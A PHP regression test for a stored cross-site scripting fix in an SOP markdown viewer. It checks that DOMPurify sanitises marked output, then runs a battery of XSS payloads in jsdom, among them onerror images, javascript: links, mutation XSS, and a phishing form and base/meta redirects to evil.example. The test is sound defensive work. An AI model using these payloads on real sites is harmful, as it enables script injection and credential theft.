<?php
/**
 * SOP viewer stored cross-site scripting (found during the GH#143 re-check, Phase 155).
 *
 * assets/js/sop.js rendered author-written markdown with `marked` and assigned the
 * result straight to innerHTML. `marked` does not sanitise, so
 *     <img src=x onerror=...>   <script>   [x](javascript:...)
 * all reached the page, and `action.manage_sop` is a broad grant (a Dispatcher-level
 * author could run script in an administrator's browser).
 *
 * Part 1 is structural and runs everywhere: the sanitiser is vendored, recorded in the
 * SBOM, loaded before sop.js, and renderMarkdown() is the ONLY place marked output is
 * produced and fails closed. Part 2 is behavioural: it runs the REAL renderMarkdown()
 * source (extracted from sop.js, not a copy) against the real vendored marked and
 * DOMPurify inside jsdom, with a battery of attack payloads and a set of benign content
 * that must survive. Part 2 needs Node and the `jsdom` package; without them it prints
 * SKIP for that part (CI installs jsdom so it does run there).
 *
 * Usage: php tests/test_gh_sop_xss.php
 */
$pass = 0; $fail = 0;
function t($label, $cond) {
    global $pass, $fail;
    echo ($cond ? "[PASS] " : "[FAIL] ") . $label . "\n";
    $cond ? $pass++ : $fail++;
}

$root = dirname(__DIR__);
$sopJs  = file_get_contents($root . '/assets/js/sop.js');
$sopPhp = file_get_contents($root . '/sop.php');

echo "=== SOP markdown sanitisation ===\n\n--- Part 1: structure ---\n\n";

t('DOMPurify is vendored', is_file($root . '/assets/vendor/dompurify/purify.min.js'));
t('both licence texts ship with it', is_file($root . '/assets/vendor/dompurify/LICENSE') && is_file($root . '/assets/vendor/dompurify/LICENSE-MPL'));
$prov = is_file($root . '/assets/vendor/dompurify/PROVENANCE.txt') ? file_get_contents($root . '/assets/vendor/dompurify/PROVENANCE.txt') : '';
$purify = file_get_contents($root . '/assets/vendor/dompurify/purify.min.js');
preg_match('/DOMPurify\s+(\d+\.\d+\.\d+)/', $purify, $mv);
t('the shipped file carries a readable version banner', !empty($mv[1]));
t('PROVENANCE.txt names that exact version', !empty($mv[1]) && strpos($prov, 'DOMPurify ' . $mv[1]) !== false);
t('PROVENANCE.txt records the file hash and it matches the shipped bytes',
    preg_match('/sha256:\s*([0-9a-f]{64})/', $prov, $mh) === 1 && hash('sha256', $purify) === $mh[1]);
$sbom = file_get_contents($root . '/SBOM.cdx.json');
t('the SBOM records DOMPurify at the shipped version', !empty($mv[1]) && strpos($sbom, '"pkg:npm/dompurify@' . $mv[1] . '"') !== false);

$posPurify = strpos($sopPhp, 'assets/vendor/dompurify/purify.min.js');
$posSop    = strpos($sopPhp, 'assets/js/sop.js');
t('sop.php loads DOMPurify', $posPurify !== false);
t('...before sop.js (so it exists when the first page renders)', $posPurify !== false && $posSop !== false && $posPurify < $posSop);

t('marked.parse is called exactly once in sop.js (one choke point)', substr_count($sopJs, 'marked.parse(') === 1);
t('that call is wrapped in DOMPurify.sanitize', (bool) preg_match('/DOMPurify\.sanitize\(\s*marked\.parse\(/', $sopJs));
t('renderMarkdown fails closed to escaped text when the sanitiser is missing',
    (bool) preg_match("/typeof DOMPurify !== 'undefined'.*?return '<pre>' \\+ escHtml\\(md\\) \\+ '<\\/pre>';/s", $sopJs));
t('forms, frames, embeds and <style> are forbidden',
    (bool) preg_match("/FORBID_TAGS:\s*\[[^\]]*'form'[^\]]*'iframe'[^\]]*'style'|FORBID_TAGS:\s*\[[^\]]*'style'[^\]]*'form'[^\]]*'iframe'/s", $sopJs));

// every innerHTML that receives rendered markdown goes through renderMarkdown()
$unsafe = 0;
foreach (preg_split('/\R/', $sopJs) as $line) {
    if (strpos($line, 'marked.parse') !== false && strpos($line, 'DOMPurify.sanitize') === false && strpos($line, '//') !== 0) {
        if (strpos(ltrim($line), '*') !== 0 && strpos(ltrim($line), '//') !== 0) $unsafe++;
    }
}
t('no line uses marked.parse outside the sanitising wrapper', $unsafe === 0);

echo "\n--- Part 2: behaviour (real sop.js source + real marked + real DOMPurify in jsdom) ---\n\n";

$node = trim((string) @shell_exec(PHP_OS_FAMILY === 'Windows' ? 'where node 2>NUL' : 'command -v node 2>/dev/null'));
$node = $node === '' ? '' : strtok($node, "\r\n");
$jsdomOk = false;
if ($node !== '') {
    $probe = @shell_exec('"' . $node . '" -e "require(\'jsdom\');console.log(\'ok\')" 2>&1');
    $jsdomOk = is_string($probe) && strpos($probe, 'ok') !== false;
}
if (!$jsdomOk) {
    echo "SKIP: Part 2 needs Node and the jsdom package (npm install jsdom); structural checks above still ran\n";
} else {
    $script = <<<'JS'
const { JSDOM } = require('jsdom');
const fs = require('fs');
const root = process.argv[2];
const dom = new JSDOM('<!doctype html><body></body>', { runScripts: 'outside-only' });
const w = dom.window;
w.eval(fs.readFileSync(root + '/assets/vendor/marked/marked.min.js', 'utf8'));
w.eval(fs.readFileSync(root + '/assets/vendor/dompurify/purify.min.js', 'utf8'));
const src = fs.readFileSync(root + '/assets/js/sop.js', 'utf8');
const m = src.match(/var SANITIZE_OPTIONS = \{[\s\S]*?\};\s*function renderMarkdown\(md\) \{[\s\S]*?\n    \}\n/);
if (!m) { console.log(JSON.stringify({ fatal: 'could not extract renderMarkdown from sop.js' })); process.exit(0); }
w.eval('function escHtml(s){var d=document.createElement("div");d.appendChild(document.createTextNode(s||""));return d.innerHTML;}\n' + m[0]);

function run(md) {
  const host = w.document.createElement('div');
  host.innerHTML = w.renderMarkdown(md);
  return host;
}
function dangerous(host) {
  const bad = [];
  host.querySelectorAll('*').forEach(function (el) {
    const tag = el.tagName.toLowerCase();
    if (['script','iframe','frame','object','embed','form','input','button','select','textarea','style','base','meta','link'].indexOf(tag) >= 0) bad.push('<' + tag + '>');
    for (const a of Array.from(el.attributes)) {
      if (/^on/i.test(a.name)) bad.push(tag + '[' + a.name + ']');
      if (/^(href|src|xlink:href|action|formaction|srcdoc)$/i.test(a.name) && /^\s*(javascript|vbscript|data:text\/html)/i.test(a.value)) bad.push(tag + '[' + a.name + '=' + a.value.slice(0, 20) + ']');
    }
  });
  return bad;
}
const attacks = {
  'img onerror': '<img src=x onerror="alert(document.domain)">',
  'script tag': 'before <script>alert(1)</script> after',
  'markdown javascript link': '[click me](javascript:alert(1))',
  'raw javascript anchor': '<a href="javascript:alert(1)">x</a>',
  'svg onload': '<svg onload=alert(1)></svg>',
  'iframe': '<iframe src="//evil.example/"></iframe>',
  'credential phishing form': '<form action="//evil.example/steal"><input name="password"><button>Sign in</button></form>',
  'style block': '<style>body{display:none}</style>',
  'div onclick': '<div onclick="alert(1)">x</div>',
  'details ontoggle': '<details open ontoggle=alert(1)>x</details>',
  'mutation XSS (math/style)': '<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">',
  'data html anchor': '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
  'srcdoc iframe': '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  'meta refresh': '<meta http-equiv="refresh" content="0;url=//evil.example">',
  'base hijack': '<base href="//evil.example/">',
  'object embed': '<object data="//evil.example/x.swf"></object><embed src="//evil.example/x.swf">',
};
const out = { attacks: {}, benign: {} };
for (const k of Object.keys(attacks)) out.attacks[k] = dangerous(run(attacks[k]));

const check = function (name, md, fn) { try { out.benign[name] = !!fn(run(md)); } catch (e) { out.benign[name] = false; } };
check('headings', '# Title\n\n## Sub', h => h.querySelector('h1') && h.querySelector('h2'));
check('bold and italic', '**bold** and *em*', h => h.querySelector('strong') && h.querySelector('em'));
check('lists', '- a\n- b\n\n1. x\n2. y', h => h.querySelectorAll('li').length === 4);
check('wide table survives', '| a | b | c |\n|---|---|---|\n| 1 | 2 | 3 |', h => h.querySelector('table') && h.querySelectorAll('td').length === 3);
check('https link keeps its href', '[site](https://example.org/x)', h => h.querySelector('a') && h.querySelector('a').getAttribute('href') === 'https://example.org/x');
check('wiki anchor link keeps its href', '[Fire SOP](#structure-fire)', h => h.querySelector('a') && h.querySelector('a').getAttribute('href') === '#structure-fire');
check('bare slug link keeps its href', '[Fire SOP](structure-fire)', h => h.querySelector('a') && h.querySelector('a').getAttribute('href') === 'structure-fire');
check('https image survives', '![logo](https://example.org/a.png)', h => h.querySelector('img') && /^https:/.test(h.querySelector('img').getAttribute('src')));
check('code block survives', '```\nls -la\n```', h => h.querySelector('pre code'));
check('inline code survives', 'use `ls`', h => h.querySelector('code'));
check('inline colour style survives', '<span style="color:red">urgent</span>', h => h.querySelector('span') && /color/.test(h.querySelector('span').getAttribute('style') || ''));
check('blockquote and hr survive', '> quote\n\n---', h => h.querySelector('blockquote') && h.querySelector('hr'));

// fail-closed: no sanitiser loaded -> escaped text, never markup
const dom2 = new JSDOM('<!doctype html><body></body>', { runScripts: 'outside-only' });
const w2 = dom2.window;
w2.eval(fs.readFileSync(root + '/assets/vendor/marked/marked.min.js', 'utf8'));
w2.eval('function escHtml(s){var d=document.createElement("div");d.appendChild(document.createTextNode(s||""));return d.innerHTML;}\n' + m[0]);
const host2 = w2.document.createElement('div');
host2.innerHTML = w2.renderMarkdown('<img src=x onerror=alert(1)><script>alert(1)</script>');
out.failClosed = { elements: host2.querySelectorAll('img, script').length, showsAsText: host2.textContent.indexOf('<img') >= 0 };
console.log(JSON.stringify(out));
JS;
    $tmp = tempnam(sys_get_temp_dir(), 'sopxss');
    file_put_contents($tmp, $script);
    $raw = shell_exec('"' . $node . '" "' . $tmp . '" "' . $root . '" 2>&1');
    @unlink($tmp);
    $res = json_decode(trim((string) $raw), true);
    if (!is_array($res) || isset($res['fatal'])) {
        t('the runtime battery ran (' . substr((string) $raw, 0, 200) . ')', false);
    } else {
        foreach ($res['attacks'] as $name => $bad) {
            t("attack neutralised: $name" . ($bad ? ' [left: ' . implode(',', $bad) . ']' : ''), count($bad) === 0);
        }
        foreach ($res['benign'] as $name => $ok) {
            t("benign content survives: $name", $ok === true);
        }
        t('with no sanitiser loaded, nothing executable is produced (fail closed)', ($res['failClosed']['elements'] ?? 1) === 0);
        t('...and the author still sees their text', ($res['failClosed']['showsAsText'] ?? false) === true);
    }
}

echo "\n=== $pass passed, $fail failed ===\n";
exit($fail > 0 ? 1 : 0);
